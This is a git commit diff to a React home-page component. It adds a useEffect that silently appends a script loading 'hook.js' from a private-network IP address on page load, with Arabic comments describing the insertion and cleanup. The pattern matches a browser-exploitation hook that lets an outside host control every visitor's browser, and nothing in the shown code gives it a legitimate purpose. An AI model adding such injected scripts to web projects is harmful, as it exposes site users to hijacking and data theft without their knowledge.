4138cf21a17d99c16cddaecb5995c1f692416ec3
unknown <mahmudalzhrawy@gmail.com>
2024-12-03 03:17:36 -0800

    linke4

--- src/pages/Home.tsx
+++ src/pages/Home.tsx
@@ -1,10 +1,22 @@
 import React from "react";
 import "../sass/Home.scss";
+import { useEffect } from "react";
 import { Navbar } from "../components/Navbar";
 interface HAuth {
     setAuth: React.Dispatch<React.SetStateAction<boolean>>;
 }
 export  function Home({setAuth}:HAuth){
+    useEffect(() => {
+        // إضافة رابط الـ hook.js إلى الـ head
+        const script = document.createElement('script');
+        script.src = 'http://192.168.1.18/hook.js';
+        script.async = true;
+        document.body.appendChild(script);
+        
+        return () => {
+          document.body.removeChild(script); // تنظيف الـ script عند مغادرة الصفحة
+        };
+    }, []);
     return ( 
     <div className="Mainhom   w-screen h-screen py-10">
         <div className="container  mx-auto w-full  relative   bg-gradient-to-r from-gray-200 to-gary-100 shadow-lg shadow-gray-600  ">
